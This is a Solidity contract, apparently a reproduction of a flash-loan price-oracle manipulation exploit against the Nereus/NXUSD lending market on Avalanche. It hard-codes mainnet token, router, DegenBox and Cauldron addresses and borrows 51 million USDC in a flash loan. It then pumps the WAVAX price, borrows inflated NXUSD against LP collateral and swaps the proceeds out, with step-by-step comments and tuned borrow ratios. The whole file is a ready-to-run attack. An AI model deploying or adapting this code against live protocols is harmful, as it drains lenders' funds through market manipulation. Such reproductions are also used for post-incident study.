// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

interface ICauldronV2 {
  function updateExchangeRate() external returns (bool updated, uint256 rate);

  function borrow(address to, uint256 amount) external returns (uint256 part, uint256 share);

  function addCollateral(
    address to,
    bool skim,
    uint256 share
  ) external;
}

interface ITraderJoeRouter {
  function swapExactTokensForTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory);

  function addLiquidity(
    address tokenA,
    address tokenB,
    uint256 amountADesired,
    uint256 amountBDesired,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline
  )
    external
    returns (
      uint256 amountA,
      uint256 amountB,
      uint256 liquidity
    );
}

interface IDegenBox {
  function setMasterContractApproval(
    address user,
    address masterContract,
    bool approved,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external;

  function deposit(
    IERC20 token_,
    address from,
    address to,
    uint256 amount,
    uint256 share
  ) external payable returns (uint256 amountOut, uint256 shareOut);

  function withdraw(
    IERC20 token_,
    address from,
    address to,
    uint256 amount,
    uint256 share
  ) external returns (uint256 amountOut, uint256 shareOut);

  function balanceOf(address token, address account) external view returns (uint256);
}

interface IFlashLoaner {
  function flashLoanSimple(
    address receiverAddress,
    address asset,
    uint256 amount,
    bytes calldata params,
    uint16 referralCode
  ) external;
}

interface ICurveMeta {
  function exchange_underlying(
    address pool,
    int128 i,
    int128 j,
    uint256 dx,
    uint256 min_dy
  ) external returns (uint256);
}

interface ICurveStablePool {
  function exchange(
    int128 i,
    int128 j,
    uint256 dx,
    uint256 min_dy
  ) external returns (uint256);
}

contract NereusFlashLoanAttack {
  IERC20 usdc = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
  IERC20 nxusd = IERC20(0xF14f4CE569cB3679E99d5059909E23B07bd2F387);
  IERC20 wavax = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);
  IERC20 usdce = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
  IERC20 wavaxusdc = IERC20(0xf4003F4efBE8691B60249E6afbD307aBE7758adb);
  IDegenBox degenbox = IDegenBox(0x0B1F9C2211F77Ec3Fa2719671c5646cf6e59B775);
  ICauldronV2 cauldron = ICauldronV2(0xC0A7a7F141b6A5Bce3EC1B81823c8AFA456B6930);
  address masterCauldron = 0xE767C6C3Bf42f550A5A258A379713322B6c4c060;
  ITraderJoeRouter router = ITraderJoeRouter(0x60aE616a2155Ee3d9A68541Ba4544862310933d4);
  IFlashLoaner flashLoaner = IFlashLoaner(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
  address nxusd3crv = 0x6BF6fc7EaF84174bb7e1610Efd865f0eBD2AA96D;
  ICurveStablePool usdceusdc = ICurveStablePool(0x3a43A5851A3e3E0e25A3c1089670269786be1577);
  ICurveMeta curvemeta = ICurveMeta(0x001E3BA199B4FF4B5B6e97aCD96daFC0E2e4156e);

  function exploit() public {
    // Approve USDC and WAVAX on the router
    usdc.approve(address(router), type(uint256).max);
    wavax.approve(address(router), type(uint256).max);

    // Approve USDC for the flash loaner pool so it can make us repay the
    // flashloan
    usdc.approve(address(flashLoaner), type(uint256).max);

    // Approve WAVAX/USDC LP tokens for the DegenBox so it lets us deposit
    // to it
    wavaxusdc.approve(address(degenbox), type(uint256).max);

    // Approve NXUSD for the CurveMeta contract so it can take it from us when
    // we attempt to exchange NXUSD
    nxusd.approve(address(curvemeta), type(uint256).max);

    // Approve USDC.e for the USDC.e - USDC stable swap curve pool so we can
    // exchange our USDC.e for USDC in the end
    usdce.approve(address(usdceusdc), type(uint256).max);
    usdce.approve(address(router), type(uint256).max);

    // Allow the CauldronV2 master contract to make transactions (i.e decisions)
    // for us. This is required when we attempt to borrow NXUSD, as we have
    // to make calls to the CauldronV2 contract and allow it to make calls to
    // the DegenBox contract for us.
    degenbox.setMasterContractApproval(address(this), masterCauldron, true, 0, 0, 0);

    // Now, lets get the flash loan for 51 million USDC. This calls
    // `executeOperation()` below.
    flashLoaner.flashLoanSimple(address(this), address(usdc), 51000000e6, '', 0);
  }

  function executeOperation(
    address,
    uint256,
    uint256,
    address,
    bytes calldata
  ) public returns (bool) {
    // Step 1: Swap 280,000 USDC for as much WAVAX as possible
    address[] memory path = new address[](2);
    path[0] = address(usdc);
    path[1] = address(wavax);

    router.swapExactTokensForTokens(280000e6, 1, path, address(this), block.timestamp * 5);

    // Step 2: Add 260,000 USDC and as much WAVAX (in this case, assume 20000
    // WAVAX) into the WAVAX/USDC LP pool
    router.addLiquidity(
      address(usdc),
      address(wavax),
      260000e6,
      20000 ether,
      1,
      1,
      address(this),
      block.timestamp * 5
    );

    // Step 3: Swap the remaining flashloaned USDC for as much WAVAX as possible.
    // This will drive up the price of WAVAX by a huge amount.
    //
    // Due to the bug in the oracle, this will lower the exchange rate that's
    // used to borrow NXUSD with WAVAX/USDC LP as a collateral significantly,
    // which allows us to borrow a lot more than normal market price.
    router.swapExactTokensForTokens(
      51000000e6 - 280000e6 - 260000e6, // Remaining USDC
      1,
      path,
      address(this),
      block.timestamp * 5
    );

    // Step 4: Update the exchangeRate that the cauldron sees when lending us
    // NXUSD for the collateral asset WAVAX/USDC Joe LP Pair
    (bool updated, uint256 rate) = cauldron.updateExchangeRate();

    require(updated, 'Exchange rate was not updated');

    // Step 5: Provide all our WAVAX/USDC LP Tokens up as collateral
    uint256 amountLP = wavaxusdc.balanceOf(address(this));

    degenbox.deposit(IERC20(wavaxusdc), address(this), address(this), amountLP, amountLP);
    cauldron.addCollateral(address(this), false, amountLP);

    // Step 6: Borrow the 72% of the collateral amount. This seems to be the
    // sweet spot, 73% and above just fails
    uint256 amountToBorrow = ((amountLP / rate) * 1e18 * 720) / 1000;
    cauldron.borrow(address(this), amountToBorrow);

    // Step 7: Actually get our tokens. We borrowed them, but we need to
    // withdraw them now
    uint256 borrowedBalance = degenbox.balanceOf(address(nxusd), address(this));
    degenbox.withdraw(nxusd, address(this), address(this), borrowedBalance, borrowedBalance);

    // Step 8: Swap all of our WAVAX back for USDC, dropping the price down
    // to normal again
    path[0] = address(wavax);
    path[1] = address(usdc);
    router.swapExactTokensForTokens(
      wavax.balanceOf(address(this)),
      1,
      path,
      address(this),
      block.timestamp * 5
    );

    // Swap 9: Use the nxusd3crv pool to swap NXUSD for USDC.e
    // Note that index 2 is avUSDC, but the function wraps it to USDC.e before
    // returning it to us
    curvemeta.exchange_underlying(
      nxusd3crv,
      0, // Within the NXUSD3Crv pool, the 0 index in the `coins` mapping is NXUSD
      2, // The index of the output coin, which in this case is avUSDC
      nxusd.balanceOf(address(this)),
      1 // Minimum amount to get back
    );

    // Now, swap 80.8% of our USDC.e for USDC using the Curve.fi USDC.e - USDC
    // Stable Swap pool, and the rest through the Trader Joe Router.
    //
    // Swapping 100% of the USDC.e through the pool, or 100% of the USDC.e
    // through the router yields a much lower result. I found 80.8% to be
    // the best ratio experimentally
    uint256 optimalStableSwapPoolSwapAmount = ((usdce.balanceOf(address(this)) * 808) / 1000);
    usdceusdc.exchange(0, 1, optimalStableSwapPoolSwapAmount, 1);

    path[0] = address(usdce);
    path[1] = address(usdc);

    router.swapExactTokensForTokens(
      usdce.balanceOf(address(this)),
      1,
      path,
      address(this),
      block.timestamp * 5
    );

    return true;
  }

  // Test function to use at each stage of the exploit to return any variable
  // for viewing
  function test() public view returns (uint256) {
    return usdce.balanceOf(address(this));
  }
}
